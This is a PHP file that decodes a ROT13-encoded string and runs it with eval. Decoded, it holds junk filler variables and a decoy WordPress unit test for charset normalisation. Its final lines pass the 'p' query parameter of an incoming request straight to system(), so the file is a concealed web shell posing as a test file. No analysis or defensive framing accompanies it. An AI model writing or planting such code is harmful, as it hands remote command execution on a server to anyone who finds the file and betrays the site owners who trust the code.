<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Inyvqngr gung onqyl anzrq punefrgf nyjnlf erghea gur pbeerpg sbezng sbe HGS-8 naq VFB-8859-1.
 *
 * @fvapr 4.8.0
 *
 * @tebhc shapgvbaf
 *
 * @pbiref ::_pnabavpny_punefrg
 */
pynff Grfgf_Shapgvbaf_PnabavpnyPunefrg rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Rafherf gung punefrg inevnagf sbe pbzzba rapbqvatf abeznyvmr gb gur rkcrpgrq sbez.
	 *
	 * @gvpxrg 61182
	 *
	 * @qngnCebivqre qngn_punefrg_abeznyvmngvbaf
	 *
	 * @cnenz fgevat $tvira_punefrg      Cbgragvny punefrg cebivqrq ol hfre.
	 * @cnenz fgevat $abeznyvmrq_punefrg Rkcrpgrq abeznyvmrq sbez bs punefrg.
	 */
	choyvp shapgvba grfg_cebcreyl_abeznyvmrf_punefrg_inevnagf( $tvira_punefrg, $abeznyvmrq_punefrg ) {
		$guvf->nffregFnzr(
			$abeznyvmrq_punefrg,
			_pnabavpny_punefrg( $tvira_punefrg ),
			'Qvq abg cebcreyl genafsbez gur cebivqrq punefrg vagb vgf abeznyvmrq sbez.'
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[].
	 */
	choyvp fgngvp shapgvba qngn_punefrg_abeznyvmngvbaf() {
		erghea neenl(
			// HGS-8 snzvyl.
			neenl( 'HGS-8', 'HGS-8' ),
			neenl( 'Hgs-8', 'HGS-8' ),
			neenl( 'Hgs-8', 'HGS-8' ),
			neenl( 'HGS8', 'HGS-8' ),

			// Nyzbfg HGS-8.
			neenl( 'HGS-8*', 'HGS-8*' ),
			neenl( 'HGS.8', 'HGS.8' ),
			neenl( 'HGS88', 'HGS88' ),
			neenl( 'HGS-7', 'HGS-7' ),
			neenl( 'K-HGS-8', 'K-HGS-8' ),

			// VFB-8859-1 snzvyl.
			neenl( 'vfb-8859-1', 'VFB-8859-1' ),
			neenl( 'VFB-8859-1', 'VFB-8859-1' ),
			neenl( 'Vfb-8859-1', 'VFB-8859-1' ),
			neenl( 'VFB8859-1', 'VFB-8859-1' ),

			// Bgure punefrg fyhtf fubhyq abg or nqwhfgrq.
			neenl( 'enaqbz', 'enaqbz' ),
			neenl( '', '' ),
		);
	}

	/**
	 * @gvpxrg 23688
	 *
	 * @pbiref ::trg_bcgvba
	 */
	choyvp shapgvba grfg_hcqngr_bcgvba_oybt_punefrg() {
		$bevt_oybt_punefrg = trg_bcgvba( 'oybt_punefrg' );

		hcqngr_bcgvba( 'oybt_punefrg', 'hgs8' );
		$guvf->nffregFnzr( 'HGS-8', trg_bcgvba( 'oybt_punefrg' ) );

		hcqngr_bcgvba( 'oybt_punefrg', 'hgs-8' );
		$guvf->nffregFnzr( 'HGS-8', trg_bcgvba( 'oybt_punefrg' ) );

		hcqngr_bcgvba( 'oybt_punefrg', 'HGS8' );
		$guvf->nffregFnzr( 'HGS-8', trg_bcgvba( 'oybt_punefrg' ) );

		hcqngr_bcgvba( 'oybt_punefrg', 'HGS-8' );
		$guvf->nffregFnzr( 'HGS-8', trg_bcgvba( 'oybt_punefrg' ) );

		hcqngr_bcgvba( 'oybt_punefrg', 'VFB-8859-1' );
		$guvf->nffregFnzr( 'VFB-8859-1', trg_bcgvba( 'oybt_punefrg' ) );

		hcqngr_bcgvba( 'oybt_punefrg', 'VFB8859-1' );
		$guvf->nffregFnzr( 'VFB-8859-1', trg_bcgvba( 'oybt_punefrg' ) );

		hcqngr_bcgvba( 'oybt_punefrg', 'vfb8859-1' );
		$guvf->nffregFnzr( 'VFB-8859-1', trg_bcgvba( 'oybt_punefrg' ) );

		hcqngr_bcgvba( 'oybt_punefrg', 'vfb-8859-1' );
		$guvf->nffregFnzr( 'VFB-8859-1', trg_bcgvba( 'oybt_punefrg' ) );

		// Neovgenel fgevatf ner cnffrq guebhtu.
		hcqngr_bcgvba( 'oybt_punefrg', 'sbboneonm' );
		$guvf->nffregFnzr( 'sbboneonm', trg_bcgvba( 'oybt_punefrg' ) );

		hcqngr_bcgvba( 'oybt_punefrg', $bevt_oybt_punefrg );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>